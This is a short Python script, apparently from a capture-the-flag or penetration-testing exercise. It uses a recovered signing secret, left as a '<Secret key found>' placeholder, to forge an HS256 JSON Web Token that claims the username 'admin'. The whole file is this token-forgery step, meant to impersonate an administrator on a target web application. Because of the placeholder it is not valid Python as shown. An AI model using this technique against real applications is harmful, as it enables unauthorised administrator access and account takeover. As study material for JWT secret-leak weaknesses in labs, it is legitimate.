#!/usr/bin/python3

import jwt

secret=<Secret key found>

token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
print(token)
